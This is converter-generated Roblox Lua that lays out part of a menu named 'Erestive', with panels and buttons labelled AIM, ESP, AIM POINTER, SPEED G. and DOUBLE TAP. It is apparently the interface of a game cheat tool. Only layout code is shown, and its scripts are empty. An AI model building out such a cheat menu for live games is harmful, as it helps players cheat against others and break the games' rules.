G2L["3ab"]["Rotation"] = 90;
G2L["3ab"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.UICorner
G2L["3ac"] = Instance.new("UICorner", G2L["3a9"]);
G2L["3ac"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.UIGradient
G2L["3ad"] = Instance.new("UIGradient", G2L["3a9"]);
G2L["3ad"]["Rotation"] = -90;
G2L["3ad"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.ImageLabel
G2L["3ae"] = Instance.new("ImageLabel", G2L["3a9"]);
G2L["3ae"]["BorderSizePixel"] = 0;
G2L["3ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3ae"]["Image"] = [[rbxassetid://127633283332495]];
G2L["3ae"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["3ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3ae"]["BackgroundTransparency"] = 1;
G2L["3ae"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.TextButton
G2L["3af"] = Instance.new("TextButton", G2L["3a9"]);
G2L["3af"]["TextWrapped"] = true;
G2L["3af"]["BorderSizePixel"] = 0;
G2L["3af"]["TextSize"] = 14;
G2L["3af"]["TextScaled"] = true;
G2L["3af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3af"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3af"]["BackgroundTransparency"] = 1;
G2L["3af"]["Size"] = UDim2.new(0, 89, 0, 34);
G2L["3af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3af"]["Text"] = [[-]];
G2L["3af"]["Position"] = UDim2.new(0.44874, 0, 0.14243, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.TextButton.LocalScript
G2L["3b0"] = Instance.new("LocalScript", G2L["3af"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.TextButton.TextLabel
G2L["3b1"] = Instance.new("TextLabel", G2L["3af"]);
G2L["3b1"]["TextWrapped"] = true;
G2L["3b1"]["BorderSizePixel"] = 0;
G2L["3b1"]["TextSize"] = 1;
G2L["3b1"]["TextScaled"] = true;
G2L["3b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b1"]["BackgroundTransparency"] = 1;
G2L["3b1"]["Size"] = UDim2.new(1, 0, 0.49763, 0);
G2L["3b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b1"]["Text"] = [[AIM]];
G2L["3b1"]["Position"] = UDim2.new(0, 0, -0.185, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG
G2L["3b2"] = Instance.new("Frame", G2L["3a4"]);
G2L["3b2"]["BorderSizePixel"] = 0;
G2L["3b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b2"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3b2"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b2"]["Name"] = [[SG]];
G2L["3b2"]["LayoutOrder"] = 6;
G2L["3b2"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.UIListLayout
G2L["3b3"] = Instance.new("UIListLayout", G2L["3b2"]);
G2L["3b3"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV
G2L["3b4"] = Instance.new("Frame", G2L["3b2"]);
G2L["3b4"]["BorderSizePixel"] = 0;
G2L["3b4"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3b4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3b4"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3b4"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.WhiteBar
G2L["3b5"] = Instance.new("Frame", G2L["3b4"]);
G2L["3b5"]["BorderSizePixel"] = 0;
G2L["3b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b5"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3b5"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3b5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3b5"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.WhiteBar.UIGradient
G2L["3b6"] = Instance.new("UIGradient", G2L["3b5"]);
G2L["3b6"]["Rotation"] = 90;
G2L["3b6"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.UICorner
G2L["3b7"] = Instance.new("UICorner", G2L["3b4"]);
G2L["3b7"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.UIGradient
G2L["3b8"] = Instance.new("UIGradient", G2L["3b4"]);
G2L["3b8"]["Rotation"] = -90;
G2L["3b8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.ImageLabel
G2L["3b9"] = Instance.new("ImageLabel", G2L["3b4"]);
G2L["3b9"]["BorderSizePixel"] = 0;
G2L["3b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3b9"]["Image"] = [[rbxassetid://127633283332495]];
G2L["3b9"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["3b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b9"]["BackgroundTransparency"] = 1;
G2L["3b9"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.TextButton
G2L["3ba"] = Instance.new("TextButton", G2L["3b4"]);
G2L["3ba"]["TextWrapped"] = true;
G2L["3ba"]["BorderSizePixel"] = 0;
G2L["3ba"]["TextSize"] = 14;
G2L["3ba"]["TextScaled"] = true;
G2L["3ba"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3ba"]["BackgroundTransparency"] = 1;
G2L["3ba"]["Size"] = UDim2.new(0, 89, 0, 34);
G2L["3ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3ba"]["Text"] = [[-]];
G2L["3ba"]["Position"] = UDim2.new(0.44874, 0, 0.14243, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.TextButton.LocalScript
G2L["3bb"] = Instance.new("LocalScript", G2L["3ba"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.TextButton.TextLabel
G2L["3bc"] = Instance.new("TextLabel", G2L["3ba"]);
G2L["3bc"]["TextWrapped"] = true;
G2L["3bc"]["BorderSizePixel"] = 0;
G2L["3bc"]["TextSize"] = 1;
G2L["3bc"]["TextScaled"] = true;
G2L["3bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3bc"]["BackgroundTransparency"] = 1;
G2L["3bc"]["Size"] = UDim2.new(1, 0, 0.49763, 0);
G2L["3bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3bc"]["Text"] = [[SPEED G.]];
G2L["3bc"]["Position"] = UDim2.new(0, 0, -0.185, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP
G2L["3bd"] = Instance.new("Frame", G2L["3a4"]);
G2L["3bd"]["BorderSizePixel"] = 0;
G2L["3bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3bd"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3bd"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3bd"]["Name"] = [[ESP]];
G2L["3bd"]["LayoutOrder"] = 4;
G2L["3bd"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.UIListLayout
G2L["3be"] = Instance.new("UIListLayout", G2L["3bd"]);
G2L["3be"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV
G2L["3bf"] = Instance.new("Frame", G2L["3bd"]);
G2L["3bf"]["BorderSizePixel"] = 0;
G2L["3bf"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3bf"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3bf"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3bf"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.WhiteBar
G2L["3c0"] = Instance.new("Frame", G2L["3bf"]);
G2L["3c0"]["BorderSizePixel"] = 0;
G2L["3c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c0"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3c0"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3c0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3c0"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.WhiteBar.UIGradient
G2L["3c1"] = Instance.new("UIGradient", G2L["3c0"]);
G2L["3c1"]["Rotation"] = 90;
G2L["3c1"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.UICorner
G2L["3c2"] = Instance.new("UICorner", G2L["3bf"]);
G2L["3c2"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.UIGradient
G2L["3c3"] = Instance.new("UIGradient", G2L["3bf"]);
G2L["3c3"]["Rotation"] = -90;
G2L["3c3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.ImageLabel
G2L["3c4"] = Instance.new("ImageLabel", G2L["3bf"]);
G2L["3c4"]["BorderSizePixel"] = 0;
G2L["3c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3c4"]["Image"] = [[rbxassetid://127633283332495]];
G2L["3c4"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["3c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c4"]["BackgroundTransparency"] = 1;
G2L["3c4"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.TextButton
G2L["3c5"] = Instance.new("TextButton", G2L["3bf"]);
G2L["3c5"]["TextWrapped"] = true;
G2L["3c5"]["BorderSizePixel"] = 0;
G2L["3c5"]["TextSize"] = 14;
G2L["3c5"]["TextScaled"] = true;
G2L["3c5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3c5"]["BackgroundTransparency"] = 1;
G2L["3c5"]["Size"] = UDim2.new(0, 89, 0, 34);
G2L["3c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c5"]["Text"] = [[-]];
G2L["3c5"]["Position"] = UDim2.new(0.44874, 0, 0.14243, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.TextButton.LocalScript
G2L["3c6"] = Instance.new("LocalScript", G2L["3c5"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.TextButton.TextLabel
G2L["3c7"] = Instance.new("TextLabel", G2L["3c5"]);
G2L["3c7"]["TextWrapped"] = true;
G2L["3c7"]["BorderSizePixel"] = 0;
G2L["3c7"]["TextSize"] = 1;
G2L["3c7"]["TextScaled"] = true;
G2L["3c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c7"]["BackgroundTransparency"] = 1;
G2L["3c7"]["Size"] = UDim2.new(1, 0, 0.49763, 0);
G2L["3c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c7"]["Text"] = [[ESP]];
G2L["3c7"]["Position"] = UDim2.new(0, 0, -0.185, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer
G2L["3c8"] = Instance.new("Frame", G2L["3a4"]);
G2L["3c8"]["BorderSizePixel"] = 0;
G2L["3c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c8"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3c8"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c8"]["Name"] = [[AimPointer]];
G2L["3c8"]["LayoutOrder"] = 2;
G2L["3c8"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.UIListLayout
G2L["3c9"] = Instance.new("UIListLayout", G2L["3c8"]);
G2L["3c9"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV
G2L["3ca"] = Instance.new("Frame", G2L["3c8"]);
G2L["3ca"]["BorderSizePixel"] = 0;
G2L["3ca"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3ca"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3ca"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3ca"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.WhiteBar
G2L["3cb"] = Instance.new("Frame", G2L["3ca"]);
G2L["3cb"]["BorderSizePixel"] = 0;
G2L["3cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3cb"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3cb"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3cb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3cb"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.WhiteBar.UIGradient
G2L["3cc"] = Instance.new("UIGradient", G2L["3cb"]);
G2L["3cc"]["Rotation"] = 90;
G2L["3cc"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.UICorner
G2L["3cd"] = Instance.new("UICorner", G2L["3ca"]);
G2L["3cd"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.UIGradient
G2L["3ce"] = Instance.new("UIGradient", G2L["3ca"]);
G2L["3ce"]["Rotation"] = -90;
G2L["3ce"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.ImageLabel
G2L["3cf"] = Instance.new("ImageLabel", G2L["3ca"]);
G2L["3cf"]["BorderSizePixel"] = 0;
G2L["3cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3cf"]["Image"] = [[rbxassetid://127633283332495]];
G2L["3cf"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["3cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3cf"]["BackgroundTransparency"] = 1;
G2L["3cf"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.TextButton
G2L["3d0"] = Instance.new("TextButton", G2L["3ca"]);
G2L["3d0"]["TextWrapped"] = true;
G2L["3d0"]["BorderSizePixel"] = 0;
G2L["3d0"]["TextSize"] = 14;
G2L["3d0"]["TextScaled"] = true;
G2L["3d0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3d0"]["BackgroundTransparency"] = 1;
G2L["3d0"]["Size"] = UDim2.new(0, 89, 0, 34);
G2L["3d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d0"]["Text"] = [[-]];
G2L["3d0"]["Position"] = UDim2.new(0.44874, 0, 0.14243, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.TextButton.LocalScript
G2L["3d1"] = Instance.new("LocalScript", G2L["3d0"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.TextButton.TextLabel
G2L["3d2"] = Instance.new("TextLabel", G2L["3d0"]);
G2L["3d2"]["TextWrapped"] = true;
G2L["3d2"]["BorderSizePixel"] = 0;
G2L["3d2"]["TextSize"] = 1;
G2L["3d2"]["TextScaled"] = true;
G2L["3d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d2"]["BackgroundTransparency"] = 1;
G2L["3d2"]["Size"] = UDim2.new(1, 0, 0.49763, 0);
G2L["3d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d2"]["Text"] = [[AIM POINTER]];
G2L["3d2"]["Position"] = UDim2.new(0, 0, -0.185, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT
G2L["3d3"] = Instance.new("Frame", G2L["3a4"]);
G2L["3d3"]["BorderSizePixel"] = 0;
G2L["3d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d3"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3d3"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d3"]["Name"] = [[DT]];
G2L["3d3"]["LayoutOrder"] = 2;
G2L["3d3"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.UIListLayout
G2L["3d4"] = Instance.new("UIListLayout", G2L["3d3"]);
G2L["3d4"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV
G2L["3d5"] = Instance.new("Frame", G2L["3d3"]);
G2L["3d5"]["BorderSizePixel"] = 0;
G2L["3d5"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3d5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3d5"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3d5"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.WhiteBar
G2L["3d6"] = Instance.new("Frame", G2L["3d5"]);
G2L["3d6"]["BorderSizePixel"] = 0;
G2L["3d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d6"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3d6"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3d6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3d6"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.WhiteBar.UIGradient
G2L["3d7"] = Instance.new("UIGradient", G2L["3d6"]);
G2L["3d7"]["Rotation"] = 90;
G2L["3d7"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.UICorner
G2L["3d8"] = Instance.new("UICorner", G2L["3d5"]);
G2L["3d8"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.UIGradient
G2L["3d9"] = Instance.new("UIGradient", G2L["3d5"]);
G2L["3d9"]["Rotation"] = -90;
G2L["3d9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.ImageLabel
G2L["3da"] = Instance.new("ImageLabel", G2L["3d5"]);
G2L["3da"]["BorderSizePixel"] = 0;
G2L["3da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3da"]["Image"] = [[rbxassetid://127633283332495]];
G2L["3da"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["3da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3da"]["BackgroundTransparency"] = 1;
G2L["3da"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.TextButton
G2L["3db"] = Instance.new("TextButton", G2L["3d5"]);
G2L["3db"]["TextWrapped"] = true;
G2L["3db"]["BorderSizePixel"] = 0;
G2L["3db"]["TextSize"] = 14;
G2L["3db"]["TextScaled"] = true;
G2L["3db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3db"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3db"]["BackgroundTransparency"] = 1;
G2L["3db"]["Size"] = UDim2.new(0, 89, 0, 34);
G2L["3db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3db"]["Text"] = [[-]];
G2L["3db"]["Position"] = UDim2.new(0.44874, 0, 0.14243, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.TextButton.LocalScript
G2L["3dc"] = Instance.new("LocalScript", G2L["3db"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.TextButton.TextLabel
G2L["3dd"] = Instance.new("TextLabel", G2L["3db"]);
G2L["3dd"]["TextWrapped"] = true;
G2L["3dd"]["BorderSizePixel"] = 0;
G2L["3dd"]["TextSize"] = 1;
G2L["3dd"]["TextScaled"] = true;
G2L["3dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3dd"]["BackgroundTransparency"] = 1;
G2L["3dd"]["Size"] = UDim2.new(1, 0, 0.49763, 0);
G2L["3dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3dd"]["Text"] = [[DOUBLE TAP]];
G2L["3dd"]["Position"] = UDim2.new(0, 0, -0.185, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL
G2L["3de"] = Instance.new("Frame", G2L["3a4"]);
G2L["3de"]["BorderSizePixel"] = 0;
G2L["3de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3de"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3de"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3de"]["Name"] = [[FL]];
G2L["3de"]["LayoutOrder"] = 4;
G2L["3de"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.UIListLayout
G2L["3df"] = Instance.new("UIListLayout", G2L["3de"]);
G2L["3df"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV
G2L["3e0"] = Instance.new("Frame", G2L["3de"]);
G2L["3e0"]["BorderSizePixel"] = 0;
G2L["3e0"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3e0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3e0"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3e0"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.WhiteBar
G2L["3e1"] = Instance.new("Frame", G2L["3e0"]);
G2L["3e1"]["BorderSizePixel"] = 0;
G2L["3e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e1"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3e1"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3e1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3e1"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.WhiteBar.UIGradient
G2L["3e2"] = Instance.new("UIGradient", G2L["3e1"]);
G2L["3e2"]["Rotation"] = 90;
G2L["3e2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.UICorner
G2L["3e3"] = Instance.new("UICorner", G2L["3e0"]);
G2L["3e3"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.UIGradient
G2L["3e4"] = Instance.new("UIGradient", G2L["3e0"]);
G2L["3e4"]["Rotation"] = -90;
G2L["3e4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.ImageLabel
G2L["3e5"] = Instance.new("ImageLabel", G2L["3e0"]);
G2L["3e5"]["BorderSizePixel"] = 0;
G2L["3e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3e5"]["Image"] = [[rbxassetid://127633283332495]];
G2L["3e5"]["Size"] = UDim2.new(0, 40, 0, 40);
